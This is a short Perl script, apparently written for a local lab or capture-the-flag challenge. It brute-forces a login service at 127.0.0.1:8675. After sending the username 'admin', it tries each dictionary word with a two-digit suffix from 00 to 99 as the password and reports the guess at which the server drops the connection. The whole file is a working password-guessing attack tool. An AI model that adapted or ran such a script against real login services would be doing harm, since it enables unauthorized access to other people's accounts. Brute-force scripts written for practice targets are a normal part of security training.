#!/usr/bin/perl --

use Modern::Perl;
use IO::Socket;

my (@wordlist, $socket, $response, $current, $quit);


&Greet; # Say hello, get dictionary, put words onto array

$socket = new IO::Socket::INET( # Create new socket
	PeerHost=>'127.0.0.1', # set IP
	PeerPort=>'8675', # set PORT
	Proto=>'tcp', # set protocol
) or die "Socket creation error\n"; # die if can't create socket

$response='username'; 
# For purposes of this, we auto set our response to "username". 
# This way we automatically send 'admin' the first time

foreach my $word (@wordlist){ # Cycle through the dictionary
	my $count = 0; # For appending purposes

	while ($count < 100){
		$| = 1; # CLEAR THE GOD FORSAKEN BUFFER EVERY GODFORSAKEN TIME
		if ($response =~ /Username/gi){ $socket->send('admin'); } # Give a username

		if ($count < 10){ # make sure we pad our counts
			$current = $word . '0'. $count;  # Append current count
		}
		else{ $current = $word . $count; }

		$socket->send($current); # send our guess
		$response = <$socket>; # get our response
		print $response if (defined $response); # print everything while it exists
		
		if (!defined $response){ # once we find a correct one, perl makes our print buffer go undef, so we're done
			print "\n\nFound correct: $current\n"; # message ourselves, we got the word
			$socket->close(); # close the socket
			printf "Exiting!\n"; exit(0); # generic exit message
		}
		else { $count++; }
		
	}
}

sub Greet{
	printf "Please provide the dictionary file: "; # Grab dictionary file from the user
	chomp (my $input = <STDIN>); # Remove newlines
	printf "Using $input for dictionary\n"; # Confirm dictionary

	open (DICT, "<", $input); # Open the dictionary for read access
	while (<DICT>){ s/\R//gi; push (@wordlist, $_);} 
		# 1) Replace newline-carriage returns "\r\n" 2) Create array of words
	close DICT; # Be nice to your dictionary
}
